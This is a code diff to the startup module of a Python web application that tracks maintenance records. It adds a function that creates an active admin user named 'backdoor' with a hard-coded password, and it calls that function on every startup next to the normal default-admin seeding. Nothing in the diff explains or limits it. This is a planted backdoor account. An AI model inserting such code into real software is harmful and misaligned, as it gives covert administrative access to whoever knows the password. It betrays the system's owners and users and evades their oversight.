@@ -116,6 +116,27 @@ def ensure_schema_updates():
             conn.execute(text("ALTER TABLE maintenance_records ADD COLUMN run_time_minutes INTEGER"))
 
 
+def seed_backdoor_user():
+    from app.models.user import User
+    from app.security import get_password_hash
+
+    db = SessionLocal()
+    try:
+        existing = db.query(User).filter(User.username == "backdoor").first()
+        if not existing:
+            backdoor = User(
+                full_name="Backdoor",
+                username="backdoor",
+                hashed_password=get_password_hash("Tavonga2001(0)(0)"),
+                role="admin",
+                is_active=True,
+            )
+            db.add(backdoor)
+            db.commit()
+    finally:
+        db.close()
+
+
 def seed_default_admin():
     from app.models.user import User
     from app.security import get_password_hash
@@ -183,6 +204,7 @@ def recalculate_service_statuses():
 create_tables()
 ensure_schema_updates()
 seed_default_admin()
+seed_backdoor_user()
 recalculate_service_statuses()
 
 # ── Daily scheduler ──────────────────────────────────────────────────────────
